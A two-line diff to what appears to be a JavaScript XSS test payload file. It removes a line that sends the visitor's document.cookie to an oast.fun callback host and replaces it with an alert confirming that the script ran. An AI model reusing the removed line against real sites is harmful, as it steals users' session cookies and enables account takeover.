@@ -1,1 +1,2 @@
-fetch('https://cpzrpwwgjlcqpettsbgnmihs5atgetsp5.oast.fun/image.png?c=' + document.cookie)  
+//Js file to say Worked
+alert(worked)
